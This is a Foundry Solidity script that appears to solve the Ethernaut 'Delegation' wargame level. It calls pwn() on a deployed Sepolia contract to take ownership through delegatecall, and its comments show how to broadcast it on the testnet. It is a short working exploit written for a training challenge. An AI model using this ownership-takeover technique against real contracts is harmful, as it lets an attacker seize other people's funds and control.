// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {Delegate} from "../src/Delegation.sol";
import {Delegation} from "../src/Delegation.sol";

interface IDelegation {
    function owner() external view returns (address);
    function pwn() external;
}

contract Exp is Script {
    // $ forge script script/DelegationExp.s.sol:Exp -vvvvv
    // $ forge script script/DelegationExp.s.sol:Exp --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast --sender $ACCOUNT_SEPOLIA -vvvvv
    // $ make delegationExp ARGS='--network sepolia'

    // 设置msg.sender为攻击者地址
    // 1 --sender $ACCOUNT_SEPOLIA
    // 2 attackContract.attack(tx.origin);
    // 3 从环境变量中取地址 export ATTACKER=0xYourAddress
    // attackContract.attack(vm.envAddress("ATTACKER"));
    //  vm.startBroadcast(attacker); // 指定广播的地址
    //  attackContract.attack(attacker); // 传入你控制的攻击地址
    // IToken public tokenInstance = IToken(0x2f3B27110b4027a59d133f2b764b347249f4cAD5); // Replace with actual deployed address if needed
    address public attacker = makeAddr("attacker");
    // address public owner = makeAddr("owner");

    function run() external {
        vm.startBroadcast(attacker);
        // Delegate delegateInstance = new Delegate(owner);
        // Delegation delegationInstance = new Delegation(address(delegateInstance));
        IDelegation delegationInstance = IDelegation(0xA409623486FF6991E93534D2203AE7719eFE25D0);
        console2.log("Delegation owner:", delegationInstance.owner()); // Check initial owner
        vm.stopBroadcast();
        changerOwner(address(delegationInstance), msg.sender); // Change ownership to the attacker  --sender $ACCOUNT_SEPOLIA
    }

    function changerOwner(address _delegateAddress, address _owner) internal {
        vm.startBroadcast(_owner);
        IDelegation delegationInstance = IDelegation(_delegateAddress); // Replace with actual deployed address
        delegationInstance.pwn();
        //(bool success,) =  delegationInstance.call(abi.encodeWithSignature("pwn()")); // Call the pwn function to change ownership
        console2.log("Delegation New owner:", delegationInstance.owner());
        vm.stopBroadcast();
    }
}
